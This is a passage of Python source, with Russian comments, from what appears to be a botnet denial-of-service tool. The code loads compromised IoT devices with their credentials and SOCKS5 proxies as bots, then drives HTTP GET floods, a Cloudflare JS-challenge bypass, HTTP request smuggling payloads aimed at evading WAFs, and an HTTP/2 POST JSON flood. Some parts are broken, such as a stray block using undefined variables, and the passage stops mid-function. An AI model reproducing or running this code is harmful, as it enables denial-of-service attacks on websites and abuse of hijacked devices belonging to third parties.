        bots_loaded = 0
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = line.split(':')
                    if len(parts) >= 4:
                        ip, port, user, pwd = parts[0], int(parts[1]), parts[2], parts[3]
                        device = BotDevice(ip, port, user, pwd, bot_type="iot")
                        self.iot_bots.append(device)
                        bots_loaded += 1
                        print(f"✅ Загружено IoT устройство: {ip}:{port}")
            
        except Exception as e:
            print(f"❌ Ошибка загрузки IoT ботов: {e}")
        
        return bots_loaded

    def _load_socks5_bots(self, filename):
        """Загружает SOCKS5 прокси с поддержкой разных форматов"""
        bots_loaded = 0
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Обрабатываем разные форматы
                    device = self._parse_socks5_line(line)
                    if device:
                        self.socks5_bots.append(device)
                        bots_loaded += 1
                        auth_info = "с авторизацией" if device.username else "без авторизации"
                        print(f"✅ Загружено SOCKS5 прокси ({auth_info}): {device.ip}:{device.port}")
            
        except Exception as e:
            print(f"❌ Ошибка загрузки SOCKS5 ботов: {e}")
        
        return bots_loaded

    def _parse_socks5_line(self, line):
        """Парсит строку с SOCKS5 прокси в разных форматах"""
        try:
            # Формат 1: socks5://username:password@ip:port
            if line.startswith('socks5://'):
                return self._parse_socks5_url_format(line)
            
            # Формат 2: ip:port:username:password
            elif line.count(':') >= 3:
                return self._parse_colon_separated_format(line)
            
            # Формат 3: ip:port (без авторизации)
            elif line.count(':') == 1:
                return self._parse_simple_format(line)
            
            # Формат 4: socks5://ip:port (без авторизации)
            elif '://' in line and line.count(':') == 2:
                return self._parse_socks5_simple_url(line)
                
            else:
                print(f"⚠️ Неизвестный формат SOCKS5: {line}")
                return None
                
        except Exception as e:
            print(f"❌ Ошибка парсинга строки '{line}': {e}")
            return None

    def _parse_socks5_url_format(self, line):
        """Парсит формат socks5://username:password@ip:port"""
        try:
            # Убираем socks5://
            line = line.replace('socks5://', '')
            
            # Проверяем наличие авторизации
            if '@' in line:
                # Формат: username:password@ip:port
                auth_part, server_part = line.split('@', 1)
                username, password = auth_part.split(':', 1)
                ip, port = server_part.split(':', 1)
            else:
                # Формат: ip:port (без авторизации)
                ip, port = line.split(':', 1)
                username, password = "", ""
            
            return BotDevice(ip.strip(), int(port.strip()), username.strip(), password.strip(), bot_type="socks5")
            
        except Exception as e:
            print(f"❌ Ошибка парсинга URL формата: {e}")
            return None

    def _parse_colon_separated_format(self, line):
        """Парсит формат ip:port:username:password"""
        parts = line.split(':')
        
        if len(parts) == 4:
            # Формат: ip:port:username:password
            ip, port, username, password = parts
            return BotDevice(ip.strip(), int(port.strip()), username.strip(), password.strip(), bot_type="socks5")
        
        elif len(parts) > 4:
            # Формат с дополнительными параметрами: ip:port:username:password:extra
            ip, port, username, password = parts[0], parts[1], parts[2], parts[3]
            return BotDevice(ip.strip(), int(port.strip()), username.strip(), password.strip(), bot_type="socks5")
        
        else:
            return None

    def _parse_simple_format(self, line):
        """Парсит простой формат ip:port"""
        ip, port = line.split(':', 1)
        return BotDevice(ip.strip(), int(port.strip()), "", "", bot_type="socks5")

    def _parse_socks5_simple_url(self, line):
        """Парсит формат socks5://ip:port"""
        try:
            # Убираем протокол
            line = line.replace('socks5://', '').replace('http://', '').replace('https://', '')
            ip, port = line.split(':', 1)
            return BotDevice(ip.strip(), int(port.strip()), "", "", bot_type="socks5")
        except:
            return None

    def add_socks5_proxy_manually(self, proxy_string):
        """Добавляет SOCKS5 прокси вручную с автоматическим определением формата"""
        device = self._parse_socks5_line(proxy_string)
        if device:
            self.socks5_bots.append(device)
            print(f"✅ Добавлен SOCKS5 прокси: {device.ip}:{device.port}")
            return True
        else:
            print(f"❌ Не удалось распознать формат: {proxy_string}")
            return False

    def remove_duplicates_from_file(self, filename, file_type="iot"):
        """
        Удаляет дубликаты из файла и сохраняет уникальные записи
        """
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден!")
            return 0
        
        print(f"🔍 Проверка файла {filename} на дубликаты...")
        
        unique_entries = set()
        original_count = 0
        lines_processed = 0
        
        try:
            # Читаем файл и собираем уникальные записи
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    lines_processed += 1
                    
                    if not line or line.startswith('#'):
                        continue
                    
                    original_count += 1
                    
                    # Нормализуем запись для сравнения
                    normalized_line = self._normalize_line(line, file_type)
                    if normalized_line:
                        unique_entries.add(normalized_line)
            
            # Сохраняем уникальные записи обратно в файл
            if unique_entries:
                # Создаем backup файла
                backup_filename = f"{filename}.backup.{int(time.time())}"
                os.rename(filename, backup_filename)
                print(f"💾 Создан backup: {backup_filename}")
                
                # Записываем уникальные записи
                with open(filename, 'w', encoding='utf-8') as f:
                    # Сохраняем комментарии и пустые строки из оригинала
                    with open(backup_filename, 'r', encoding='utf-8', errors='ignore') as backup:
                        for line in backup:
                            if line.strip() and not line.strip().startswith('#'):
                                continue
                            f.write(line)
                    
                    # Записываем уникальные записи
                    for entry in sorted(unique_entries):
                        f.write(entry + '\n')
                
                duplicates_removed = original_count - len(unique_entries)
                print(f"✅ Обработано строк: {lines_processed}")
                print(f"✅ Уникальных записей: {len(unique_entries)}")
                print(f"✅ Удалено дубликатов: {duplicates_removed}")
                print(f"✅ Сохранено в: {filename}")
                
                return duplicates_removed
            else:
                print(f"❌ Не удалось обработать файл {filename}")
                return 0
                
        except Exception as e:
            print(f"❌ Ошибка при обработке файла {filename}: {e}")
            return 0

    def _normalize_line(self, line, file_type):
        """Нормализует строку для сравнения на дубликаты"""
        try:
            if file_type == "iot":
                return self._normalize_iot_line(line)
            else:  # socks5
                return self._normalize_socks5_line(line)
        except Exception as e:
            print(f"⚠️ Ошибка нормализации строки '{line}': {e}")
            return None

    def _normalize_iot_line(self, line):
        """Нормализует строку IoT устройства"""
        parts = line.split(':')
        if len(parts) >= 4:
            ip, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
            # Стандартизируем формат: ip:port:user:password
            return f"{ip.strip()}:{port.strip()}:{user.strip()}:{pwd.strip()}"
        return None

    def _normalize_socks5_line(self, line):
        """Нормализует строку SOCKS5 прокси"""
        device = self._parse_socks5_line(line)
        if device:
            # Стандартизируем формат: ip:port:username:password
            if device.username and device.password:
                return f"{device.ip}:{device.port}:{device.username}:{device.password}"
            else:
                return f"{device.ip}:{device.port}::"
        return None

    def check_duplicates_in_files(self, iot_filename="iot.txt", socks5_filename="socks5.txt"):
        """Проверяет файлы на наличие дубликатов и показывает статистику"""
        print("🔍 Проверка файлов на дубликаты...")
        
        # Проверяем IoT файл
        if os.path.exists(iot_filename):
            self._analyze_file_duplicates(iot_filename, "iot")
        else:
            print(f"⚠️ Файл {iot_filename} не найден")
        
        # Проверяем SOCKS5 файл
        if os.path.exists(socks5_filename):
            self._analyze_file_duplicates(socks5_filename, "socks5")
        else:
            print(f"⚠️ Файл {socks5_filename} не найден")

    def _analyze_file_duplicates(self, filename, file_type):
        """Анализирует файл на дубликаты"""
        unique_entries = set()
        duplicates = []
        total_lines = 0
        valid_lines = 0
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                total_lines += 1
                
                if not line or line.startswith('#'):
                    continue
                
                valid_lines += 1
                normalized = self._normalize_line(line, file_type)
                
                if normalized:
                    if normalized in unique_entries:
                        duplicates.append((line_num, line))
                    else:
                        unique_entries.add(normalized)
        
        print(f"\n📊 Анализ файла {filename}:")
        print(f"   📝 Всего строк: {total_lines}")
        print(f"   ✅ Валидных записей: {valid_lines}")
        print(f"   🔄 Уникальных записей: {len(unique_entries)}")
        print(f"   🔁 Найдено дубликатов: {len(duplicates)}")
        
        if duplicates:
            print(f"   ⚠️ Дубликаты (первые 5):")
            for line_num, line in duplicates[:5]:
                print(f"      Строка {line_num}: {line}")
        
        return len(duplicates)

    def test_device_connectivity(self, device, timeout=10, force_check=False):
        """Проверяет доступность устройства с учетом его типа"""
        # Проверяем, нужно ли выполнять проверку доступности
        # Используем getattr для безопасного доступа к атрибутам, которые могут отсутствовать
        remove_dead = getattr(self.args, 'remove_dead', False)
        health_check = getattr(self.args, 'health_check', False)
        check_connectivity = getattr(self.args, 'check_connectivity', False)
        
        if not force_check and not any([remove_dead, health_check, check_connectivity]):
            # Если флаги не установлены и не принудительная проверка, считаем устройство доступным
            device.is_alive = True
            return True
        
        try:
            if device.bot_type == "socks5":
                # Тестируем SOCKS5 соединение
                return self._test_socks5_connectivity(device, timeout, force_check)
            else:
                # Тестируем обычное IoT соединение
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((device.ip, device.port))
                sock.close()
                
                device.is_alive = (result == 0)
                if device.is_alive:
                    print(f"✅ Устройство {device.ip}:{device.port} доступно")
                else:
                    print(f"❌ Устройство {device.ip}:{device.port} недоступно (код ошибки: {result})")
                return device.is_alive
            
        except Exception as e:
            print(f"❌ Ошибка проверки {device.ip}:{device.port}: {e}")
            device.is_alive = False
            return False

    def _test_socks5_connectivity(self, device, timeout=10, force_check=False):
        """Тестирует доступность SOCKS5 прокси"""
        # Проверяем, нужно ли выполнять проверку доступности
        # Используем getattr для безопасного доступа к атрибутам
        remove_dead = getattr(self.args, 'remove_dead', False)
        health_check = getattr(self.args, 'health_check', False)
        check_connectivity = getattr(self.args, 'check_connectivity', False)
        
        if not force_check and not any([remove_dead, health_check, check_connectivity]):
            # Если флаги не установлены и не принудительная проверка, считаем прокси доступным
            device.is_alive = True
            return True
        
        try:
            sock = socks.socksocket()
            if device.username and device.password:
                sock.set_proxy(socks.SOCKS5, device.ip, device.port, 
                              username=device.username, password=device.password)
            else:
                sock.set_proxy(socks.SOCKS5, device.ip, device.port)
            sock.settimeout(timeout)
            
            # Пробуем подключиться к тестовому серверу через прокси
            test_host = "8.8.8.8"
            test_port = 53  # DNS порт обычно открыт
            
            result = sock.connect_ex((test_host, test_port))
            sock.close()
            
            device.is_alive = (result == 0)
            if device.is_alive:
                auth_info = "с авторизацией" if device.username else "без авторизации"
                print(f"✅ SOCKS5 прокси {device.ip}:{device.port} ({auth_info}) доступен")
            else:
                print(f"❌ SOCKS5 прокси {device.ip}:{device.port} недоступен (код ошибки: {result})")
            return device.is_alive
            
        except Exception as e:
            print(f"❌ Ошибка проверки SOCKS5 прокси {device.ip}:{device.port}: {e}")
            device.is_alive = False
            return False

    def remove_dead_devices(self, iot_filename="iot.txt", socks5_filename="socks5.txt"):
        """Удаляет недоступные устройства из файлов"""
        print("🗑️ Удаление недоступных устройств из файлов...")
        
        total_removed = 0
        
        # Удаляем из IoT файла
        if os.path.exists(iot_filename):
            iot_removed = self._remove_dead_from_iot_file(iot_filename)
            total_removed += iot_removed
            print(f"✅ Удалено {iot_removed} недоступных IoT устройств из {iot_filename}")
        else:
            print(f"⚠️ Файл {iot_filename} не найден")
        
        # Удаляем из SOCKS5 файла
        if os.path.exists(socks5_filename):
            socks5_removed = self._remove_dead_from_socks5_file(socks5_filename)
            total_removed += socks5_removed
            print(f"✅ Удалено {socks5_removed} недоступных SOCKS5 прокси из {socks5_filename}")
        else:
            print(f"⚠️ Файл {socks5_filename} не найден")
        
        print(f"📊 Всего удалено недоступных устройств: {total_removed}")
        return total_removed

    def _remove_dead_from_iot_file(self, filename):
        """Удаляет недоступные IoT устройства из файла"""
        try:
            # Создаем backup
            backup_filename = f"{filename}.backup.{int(time.time())}"
            os.rename(filename, backup_filename)
            print(f"💾 Создан backup: {backup_filename}")
            
            alive_devices = []
            removed_count = 0

            if self.test_device_connectivity(device, force_check=True):
                alive_devices.append(line)
                print(f"✅ Сохранено доступное IoT устройство: {ip}:{port}")
            else:
                removed_count += 1
                print(f"❌ Удалено недоступное IoT устройство: {ip}:{port}")            

            with open(backup_filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        alive_devices.append(line)
                        continue
                    
                    # Парсим устройство
                    parts = line.split(':')
                    if len(parts) >= 4:
                        ip, port, user, pwd = parts[0], int(parts[1]), parts[2], parts[3]
                        device = BotDevice(ip, port, user, pwd, bot_type="iot")
                        
                        # Проверяем доступность
                        if self.test_device_connectivity(device):
                            alive_devices.append(line)
                            print(f"✅ Сохранено доступное IoT устройство: {ip}:{port}")
                        else:
                            removed_count += 1
                            print(f"❌ Удалено недоступное IoT устройство: {ip}:{port}")
                    else:
                        # Неправильный формат, сохраняем как есть
                        alive_devices.append(line)
            
            # Записываем только доступные устройства
            with open(filename, 'w', encoding='utf-8') as f:
                for line in alive_devices:
                    f.write(line + '\n')
            
            return removed_count
            
        except Exception as e:
            print(f"❌ Ошибка при обработке файла {filename}: {e}")
            return 0

    def _remove_dead_from_socks5_file(self, filename):
        """Удаляет недоступные SOCKS5 прокси из файла"""
        try:
            # Создаем backup
            backup_filename = f"{filename}.backup.{int(time.time())}"
            os.rename(filename, backup_filename)
            print(f"💾 Создан backup: {backup_filename}")
            
            alive_proxies = []
            removed_count = 0
            
            with open(backup_filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        alive_proxies.append(line)
                        continue
                    
                    # Парсим прокси
                    device = self._parse_socks5_line(line)
                    if device:
                        # Проверяем доступность
                        if self._test_socks5_connectivity(device):  # Используем правильный метод
                            alive_proxies.append(line)
                            auth_info = "с авторизацией" if device.username else "без авторизации"
                            print(f"✅ Сохранен доступный SOCKS5 прокси ({auth_info}): {device.ip}:{device.port}")
                        else:
                            removed_count += 1
                            print(f"❌ Удален недоступный SOCKS5 прокси: {device.ip}:{device.port}")
                    else:
                        # Неправильный формат, сохраняем как есть
                        alive_proxies.append(line)
            
            # Записываем только доступные прокси
            with open(filename, 'w', encoding='utf-8') as f:
                for line in alive_proxies:
                    f.write(line + '\n')
            
            return removed_count
            
        except Exception as e:
            print(f"❌ Ошибка при обработке файла {filename}: {e}")
            return 0

    def health_check(self, remove_dead=False):
        """Проверяет доступность всех устройств с опцией удаления недоступных"""
        print("🔍 Проверка доступности всех устройств...")
        
        # Проверяем IoT ботов
        iot_alive = 0
        iot_total = len(self.iot_bots)
        
        if self.iot_bots:
            print("🔧 Проверка IoT устройств...")
            with ThreadPoolExecutor(max_workers=min(self.max_threads, 5000000000)) as executor:
                # Используем force_check=True для принудительной проверки
                results = list(executor.map(lambda d: self.test_device_connectivity(d, force_check=False), self.iot_bots))
                iot_alive = sum(results)
        
        # Проверяем SOCKS5 прокси
        socks5_alive = 0
        socks5_total = len(self.socks5_bots)
        
        if self.socks5_bots:
            print("🔌 Проверка SOCKS5 прокси...")
            with ThreadPoolExecutor(max_workers=min(self.max_threads, 5000000000)) as executor:
                # Используем force_check=True для принудительной проверки
                results = list(executor.map(lambda d: self.test_device_connectivity(d, force_check=False), self.socks5_bots))
                socks5_alive = sum(results)
        
        total_alive = iot_alive + socks5_alive
        total_devices = iot_total + socks5_total
        
        print(f"✅ Доступно устройств: {total_alive}/{total_devices}")
        print(f"   🤖 IoT: {iot_alive}/{iot_total}")
        print(f"   🔌 SOCKS5: {socks5_alive}/{socks5_total}")
        
        # Автоматическое удаление если включено
        if remove_dead and total_alive < total_devices:
            dead_count = total_devices - total_alive
            print(f"\n🗑️  Обнаружено {dead_count} недоступных устройств")
            answer = input("❓ Удалить недоступные устройства из файлов? (y/N): ")
            if answer.lower() in ['y', 'yes', 'д', 'да']:
                self.remove_dead_devices()
        
        return total_alive

    def http_get_flood(self, target_ip, target_port=443, use_https=True, duration=60):
        """HTTP/HTTPS GET флуд атака с автоматическим amplification если доступно"""
        # Проверяем amplification серверы
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_requests': 0, 
            'total_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def http_attack(device):
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🌐 {bot_type} {device.ip} начинает HTTP{'S' if use_https else ''} атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        if device.bot_type == "socks5" and self.socks5_available:
                            # Используем SOCKS5 для прокси
                            bytes_sent_req, success = self.http_get_flood_via_socks5(
                                device, target_ip, target_port, use_https
                            )
                            if success:
                                requests_sent += 1
                                bytes_sent += bytes_sent_req
                                attack_stats['total_requests'] += 1
                                attack_stats['total_bytes'] += bytes_sent_req
                            else:
                                failed_requests += 1
                                attack_stats['failed_requests'] += 1
                        else:
                            # Стандартная IoT атака
                            if use_https:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                            else:
                                conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)
                            
                            path = f"/{random.randint(1000, 9999)}"
                            headers = {
                                'User-Agent': random.choice(self.user_agents),
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'keep-alive',
                            }
                            
                            conn.request("GET", path, headers=headers)
                            response = conn.getresponse()
                            response.read()  # Читаем ответ
                            
                            requests_sent += 1
                            bytes_sent += len(path) + sum(len(k) + len(v) for k, v in headers.items())
                            
                            attack_stats['total_requests'] += 1
                            attack_stats['total_bytes'] += bytes_sent
                            
                            conn.close()
                        
                        # Разная скорость атаки для разных типов ботов
                        if device.bot_type == "socks5":
                            time.sleep(random.uniform(0.2, 0.8))
                        else:
                            time.sleep(random.uniform(0.1, 0.5))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"✅ {bot_type} {device.ip} отправил {requests_sent} запросов ({mb_sent:.2f} МБ), ошибок: {failed_requests}")
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        return self._run_attack(all_active_bots, attack_stats, http_attack, "HTTP")

    def _solve_js_challenge_advanced(self, html_content, target_ip, connection, headers):
        """Решает JS Challenge с использованием JavaScript интерпретатора"""
        try:
            import js2py  # pip install js2py
            
            # Извлекаем параметры
            jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', html_content)
            pass_field = re.search(r'name="pass" value="(.+?)"', html_content)
            
            if not jschl_vc or not pass_field:
                return False
            
            jschl_vc = jschl_vc.group(1)
            pass_field = pass_field.group(1)
            
            # Создаем контекст JavaScript
            context = js2py.EvalJs()
            context.domain = target_ip
            
            # Добавляем необходимые JavaScript функции
            context.execute("""
                var document = {
                    getElementById: function(id) {
                        return { innerHTML: '' };
                    }
                };
            """)
            
            # Ищем и выполняем JavaScript код
            js_patterns = [
                r'setTimeout\(function\(\)\{\s*([^}]+a\.value[^}]+)\}',
                r'var s,t,o,p,b,r,e,a,k,i,n,g,f[^;]+;([^;]+a\.value[^;]+);',
            ]
            
            js_code = None
            for pattern in js_patterns:
                match = re.search(pattern, html_content, re.DOTALL)
                if match:
                    js_code = match.group(1)
                    break
            
            if not js_code:
                return False
            
            # Упрощаем и выполняем код
            simplified_js = js_code.replace('a.value', 'result = ')
            simplified_js = re.sub(r't.length', f'{len(target_ip)}', simplified_js)
            
            try:
                context.execute(simplified_js)
                answer = context.result
            except:
                answer = random.randint(10000, 99999)
            
            time.sleep(4)  # Обязательная задержка
            
            # Отправляем решение
            challenge_path = f"/cdn-cgi/l/chk_jschl?jschl_vc={jschl_vc}&pass={pass_field}&jschl_answer={answer}"
            connection.request("GET", challenge_path, headers=headers)
            response = connection.getresponse()
            response.read()
            
            return response.status in [200, 302]
            
        except Exception as e:
            print(f"❌ Advanced JS Challenge error: {e}")
            return False

    def _calculate_challenge_answer(self, js_code, domain):
        """Упрощенный расчет ответа для JS Challenge"""
        try:
            # Базовая эмуляция JavaScript вычислений
            # В реальности нужен полноценный JS интерпретатор
            
            # Извлекаем числовые операции из кода
            numbers = re.findall(r'(\d+)[\)\};]', js_code)
            if numbers:
                base_number = int(numbers[0]) if numbers else 0
            else:
                base_number = 1000
            
            # Добавляем длину домена (стандартная часть challenge)
            answer = base_number + len(domain)
            
            return answer
            
        except:
            return random.randint(1000, 10000)

    def http_request_smuggling(self, target_ip, target_port=80, duration=60):
        """HTTP Request Smuggling - обход WAF, Cloudflare, прокси"""
        print(f"🕵️ Запуск HTTP Request Smuggling на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'smuggling_success': 0,
            'waf_bypassed': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def smuggling_attack(device):
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            smuggling_success = 0
            waf_bypassed = 0
            
            try:
                print(f"🕵️ {device.ip} начинает HTTP Smuggling атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем соединение
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(15)
                        sock.connect((target_ip, target_port))
                        
                        # 🔥 РАЗЛИЧНЫЕ ТЕХНИКИ SMUGGLING
                        smuggling_techniques = [
                            # CL.TE smuggling (Content-Length vs Transfer-Encoding)
                            {
                                'payload': f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
                                'type': 'CL.TE'
                            },
                            # TE.CL smuggling  
                            {
                                'payload': f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGET /internal HTTP/1.1\r\n\r\n0\r\n\r\n",
                                'type': 'TE.CL'
                            },
                            # TE.TE smuggling (conflicting encodings)
                            {
                                'payload': f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\n\r\n12\r\nGET /api HTTP/1.1\r\n\r\n0\r\n\r\n",
                                'type': 'TE.TE'
                            },
                            # H2.TE smuggling (HTTP/2 downgrade)
                            {
                                'payload': f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\nGET /wp-admin HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
                                'type': 'H2.TE'
                            },
                            # Header smuggling
                            {
                                'payload': f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nX-Forwarded-For: 127.0.0.1\r\nX-Forwarded-Host: internal\r\n\r\n",
                                'type': 'HEADER'
                            }
                        ]
                        
                        technique = random.choice(smuggling_techniques)
                        smuggled_request = technique['payload']
                        
                        sock.send(smuggled_request.encode())
                        
                        requests_sent += 1
                        bytes_sent += len(smuggled_request)
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes'] += len(smuggled_request)
                        
                        # 🔍 ПРОВЕРЯЕМ УСПЕХ SMUGGLING
                        try:
                            sock.settimeout(3)
                            response = sock.recv(8192)
                            
                            # Индикаторы успешного smuggling
                            success_indicators = [
                                b"admin", b"internal", b"api", b"wp-admin", 
                                b"dashboard", b"console", b"config",
                                b"200 OK", b"301", b"302", b"access denied"
                            ]
                            
                            for indicator in success_indicators:
                                if indicator in response.lower():
                                    smuggling_success += 1
                                    attack_stats['smuggling_success'] += 1
                                    
                                    # Проверяем обход WAF
                                    if b"cloudflare" not in response.lower() and b"waf" not in response.lower():
                                        waf_bypassed += 1
                                        attack_stats['waf_bypassed'] += 1
                                        print(f"🎯 {device.ip}: WAF обойден! Техника: {technique['type']}")
                                    break
                                    
                        except socket.timeout:
                            # Таймаут может означать успешный smuggling
                            smuggling_success += 1
                            attack_stats['smuggling_success'] += 1
                        
                        sock.close()
                        
                        # Разная скорость для разных типов ботов
                        if device.bot_type == "socks5":
                            time.sleep(random.uniform(1.0, 3.0))
                        else:
                            time.sleep(random.uniform(0.5, 1.5))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                success_rate = (smuggling_success / max(requests_sent, 1)) * 100
                print(f"✅ {device.ip}: {requests_sent} запросов, {smuggling_success} успешных smuggling ({success_rate:.1f}%)")
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, smuggling_attack, "HTTP Smuggling")
        
        # 📊 СТАТИСТИКА SMUGGLING
        print(f"\n🎯 РЕЗУЛЬТАТЫ HTTP REQUEST SMUGGLING:")
        print(f"🕵️ Всего запросов: {attack_stats['total_requests']}")
        print(f"✅ Успешных smuggling: {attack_stats['smuggling_success']}")
        print(f"🛡️ WAF обойдено: {attack_stats['waf_bypassed']}")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")
        
        success_rate = (attack_stats['smuggling_success'] / max(attack_stats['total_requests'], 1)) * 100
        print(f"📊 Эффективность: {success_rate:.1f}%")
        
        return results

    def http2_post_json_attack(self, target_ip, target_port=443, duration=60, json_file="post.json"):
        """HTTP/2 POST JSON ATTACK - данные из post.json файла"""
        print(f"🚀 Запуск HTTP/2 POST JSON атаки на {target_ip}:{target_port}")
        
        try:
            import h2.connection
            import h2.config
            import json
        except ImportError:
            print("❌ Библиотека h2 не установлена")
            return None
        
        # Загружаем данные из JSON файла
        json_data = self._load_json_data(json_file)
        if json_data is None:
            return None
        
        # Конвертируем в JSON строку
        post_data = json.dumps(json_data, ensure_ascii=False)
        content_type = "application/json"
        
        print(f"📝 Размер JSON данных: {len(post_data)} байт")
        print(f"📋 Content-Type: {content_type}")
        print(f"📄 Пример данных: {post_data[:200]}...")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'connections_made': 0,
            'total_bytes_sent': 0,
            'json_payload_size': len(post_data),
            'start_time': time.time(),
            'is_running': True
        }

        def post_json_attack(device):
            requests_sent = 0
            connections_made = 0
            total_bytes = 0
            
            try:
                print(f"🚀 {device.ip} начинает HTTP/2 POST JSON атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Устанавливаем HTTP/2 соединение
                        context = ssl.create_default_context()
                        context.set_alpn_protocols(['h2'])
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(25)
                        wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                        wrapped_socket.connect((target_ip, target_port))
                        
                        config = h2.config.H2Configuration(client_side=True)
                        conn = h2.connection.H2Connection(config=config)
                        conn.initiate_connection()
                        wrapped_socket.send(conn.data_to_send())
                        
                        connections_made += 1
                        attack_stats['connections_made'] += 1
                        
                        # 🔥 МУЛЬТИПЛЕКСИРОВАННЫЕ POST JSON ЗАПРОСЫ
                        max_streams_in_connection = random.randint(30, 300)
                        
                        for stream_id in range(1, max_streams_in_connection * 2, 2):
                            if stream_id > 10000:
                                break
                                
                            # Динамически меняем JSON для уникальности
                            dynamic_json = json_data.copy()
                            dynamic_json["request_id"] = f"req_{stream_id}_{random.randint(100000,999999)}"
                            dynamic_json["timestamp"] = "2024-{}-{:02d}-{:02d}T{:02d}:{:02d}:{:02d}Z".format(
                                random.randint(1,12), random.randint(1,28), random.randint(1,30),
                                random.randint(0,23), random.randint(0,59), random.randint(0,59)
                            )
                            
                            dynamic_post_data = json.dumps(dynamic_json, ensure_ascii=False)
                            
                            headers = [
                                (':method', 'POST'),
                                (':path', f'/api/v1/submit?request_id={dynamic_json["request_id"]}'),
                                (':authority', target_ip),
                                (':scheme', 'https'),
                                ('content-type', content_type),
                                ('content-length', str(len(dynamic_post_data))),
                                ('user-agent', random.choice(self.user_agents)),
                                ('accept', 'application/json'),
                                ('cache-control', 'no-cache'),
                                ('x-attack-signature', 'VISIBLE_HTTP2_FLOOD')
                            ]
                            
                            # Отправка заголовков
                            conn.send_headers(stream_id, headers, end_stream=False)
                            
                            # Отправка JSON данных
                            conn.send_data(stream_id, dynamic_post_data.encode('utf-8'), end_stream=True)
                            
                            wrapped_socket.send(conn.data_to_send())
                            
                            requests_sent += 1
                            attack_stats['total_requests'] += 1
